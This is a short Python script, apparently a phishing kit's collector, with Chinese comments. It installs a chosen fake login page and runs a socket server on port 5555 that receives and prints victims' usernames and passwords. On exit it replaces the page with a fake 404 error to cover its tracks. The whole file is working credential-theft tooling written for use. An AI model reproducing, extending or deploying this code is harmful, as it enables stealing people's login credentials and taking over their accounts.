#show password and username
from gofish_log import log
import socket
import threading
class Go_Fish():
    def __init__(self):
        self.pysock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.pysock.bind(("",5555))
    def select_gofish_webpage(self,select_code):
        #选择钓鱼网页类型
        if select_code == '0':
            print("[-]程序已终止运行")
            exit()
        else:
            try:
                with open(f"./go_fish_web/login_gofish_{select_code}.html",'r',encoding="utf-8") as red:
                    gofish_webpage_code = red.read()
                    open("./login.html",'wb').write(gofish_webpage_code.encode("utf-8"))
            except:
                print("[-]钓鱼网页不存在，请重新选择！")
                return


        gofish_threading = threading.Thread(target=self.start_server,args=())
        gofish_threading.start() #开启钓鱼网页信息捕获线程

        # 当按下Enter键时终止socket的运行，同时将钓鱼网页无法正常访问->网页抛出404错误代码
        def initialization_fish_webpage():
            input("")
            open("./login.html", 'wb').write("<h1>Error: 404 Not Find !<h1>".encode("utf-8"))
            self.pysock.close()
        exit_threading = threading.Thread(target=initialization_fish_webpage,args=())
        exit_threading.start() #开启选择终止程序线程

        exit_threading.join()
        gofish_threading.join()
        print("[-]程序已终止运行（431003）")
        return "431003"
        #self.start_server()
    def start_server(self):
        self.pysock.listen()
        print("钓鱼信息收集系统开启！【Enter键退出】")
        print("----------------------------")
        while True:
            #当按下Enter键时socket套接字关闭，accept堵塞触发异常，终止程序运行
            try:
                new_sock,addr = self.pysock.accept()
            except:
                exit()
            data = new_sock.recv(10244)
            data_fish = data.decode("utf-8")
            username = data_fish.split("::")[0]
            password = data_fish.split("::")[1]

            print(username)
            print(password)
            print("----------------------------")
            new_sock.close()
def main():
    print(log()) #展示脚本log和钓鱼网页类型选择
    gofish = Go_Fish()
    while True:
        select_code = input("请选择一个钓鱼网页：")
        exit_code = gofish.select_gofish_webpage(select_code) #当程序的双子线程结束后会抛出退出码
        if exit_code == "431003":
            exit() #接收到对应的退出码后终止主线程运行

if __name__ == '__main__':
    main()